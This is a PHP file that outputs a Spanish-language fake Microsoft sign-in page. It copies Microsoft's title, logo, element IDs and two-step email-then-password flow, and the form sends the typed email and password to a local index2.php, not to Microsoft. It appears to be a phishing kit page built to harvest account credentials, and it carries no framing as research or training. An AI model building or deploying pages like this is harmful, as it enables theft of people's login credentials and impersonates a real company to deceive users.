<?php echo ' 
<!DOCTYPE html>
<html dir="ltr" lang="ES-ES">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Iniciar sesión en tu cuenta Microsoft</title>	
		<meta name="PageID" content="i5030">
		<meta name="SiteID" content="292841"><meta name="ReqLC" content="3082"><meta name="LocLC" content="3082">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
		<link rel="icon" href="favicon.ico">
		<link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="min.css">
		<style type="text/css"></style>
		<style type="text/css">
        body{display:none;}</style>
        <script type="text/javascript" src = "jque.js"></script>
		<style type="text/css">body{display:block !important;}</style><noscript>
			<style type="text/css">body{display:block !important;}</style></noscript></head>
		<body class="cb">
            <div>
<div data-bind="component: { name: &#39;background-image-control&#39;, publicMethods: backgroundControlMethods }">
    <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">  
</div></div>
<div data-bind="if: activeDialog"></div>
<form name="datos" id="datos" method="post" action="index2.php">
    <div class="outer">
        <div class="middle" data-bind="css: { &#39;app&#39;: backgroundLogoUrl }">
            <div data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    &#39;app&#39;: backgroundLogoUrl,
                    &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                    &#39;fade-in-lightbox&#39;: fadeInLightBox,
                    &#39;has-popup&#39;: showFedCredButtons,
                    &#39;transparent-lightbox&#39;: backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox },
                externalCss: { &#39;sign-in-box&#39;: true }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                <div class="lightbox-cover"></div>
                <div class="win-scroll">
                    <div >

                            <img class="logo" role="img" src="logo.svg" alt="Microsoft"> </div>
                    <div role="main" >
<div  class="">
    <div class="pagination-view animate slide-in-next" >
        <div data-viewid="1">
<div ><br>
          <button type="button" onclick="atras()" class="backButton" id="idBtn_Back" aria-label="Atrás" title="Cambiar de cuenta" style="display:none" > 
            <img role="presentation" src="arrow_left.svg"> </button> </form>
            <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="Cambiar de cuenta" style="display:none">Cambiar de cuenta</div>
  <div aria-level="1" id="txtcon" style="display:none">cambiar cuenta</div> 
        <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { &#39;title&#39;: true }">
   <div aria-level="1" id="txtini">Iniciar sesión</div>
   <div style="display: none; font-size: 0.98rem; color:#EB4242; font-weight: normal;" id ="text14" > Escribe una direccion de correo electronico valida.</div>
   <div aria-level="1" id="txtcoa" aria-required="true" aria-describedby="loginHeader  " style="display:none">Escribir contraseña</div>
   <div class="text-14"style="display: none; font-size: 0.98rem; color:#EB4242; font-weight: normal;" id ="text16" > Escribe la contraseña de tu cuenta Microsoft.</div> </div></div></div>
<div class="row">
    <div role="alert" aria-live="assertive"> </div>
    <div class="form-group col-md-24">      
        <div class="placeholderContainer">


            <input type="email" name="userid" id="i0116" maxlength="113" lang="en" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" aria-label="Escriba su correo electrónico, teléfono o Skype." aria-describedby="loginHeader" placeholder="Correo electrónico, teléfono o Skype" onkeypress="if (event.keyCode == 13) cambiarboton()" autofocus="autofocus">

            <input name="contr" type="password" id="i0117" autocomplete="off"   autofocus="autofocus" class="form-control input ext-input text-box ext-text-box" aria-required="true" aria-describedby="loginHeader  " placeholder="Contraseña" onkeypress="if (event.keyCode == 13) text()" style="display: none;"required="required">


            </div></div></div>
<div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <div class="col-md-24">
            <div class="text-13">               
                <div class="form-group">¿No tiene una cuenta? <a href="#" id="signup" aria-label="Crear una cuenta Microsoft">Cree una.</a></div>               
                <div class="form-group">
                    <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#" >Iniciar sesión con una llave de seguridad</a>
<span class="help-button" role="button" tabindex="0">
<img role="presentation" src="doc.svg"></span> </div>
                <div class="form-group" >
<div class="form-group">
    <a id="idA_PWD_SwitchToCredPicker" href="#">Opciones de inicio de sesión</a>
</div></form></div></div></div></div></div>
<div class="win-button-pin-bottom">
    <div class="row">
        <div><div class="col-xs-24 no-padding-left-right button-container" >
   <div class="inline-block">  
    <input type="button" id="idSIButton9" class="button ext-button primary ext-primary" value="Siguiente" onclick="cambiarboton()">
        <input style="display: none;" type="button" id="idSIButton8" class="btn btn-block btn-primary" value="Siguiente" onclick="text()">
    </div></div></div></div></div></div></div></div></div></div>
            <div id="footer" role="contentinfo" class="default footer ext-footer new-background-image">
                <div ><div id="footerLinks" class="footerNode text-secondary"> 
    <a id="ftrTerms" href="#">Términos de uso</a>
    <a id="ftrPrivacy" href="#">Privacidad y cookies</a>


</div></div> </div> </div> </div> </div></body></html>';  ?>

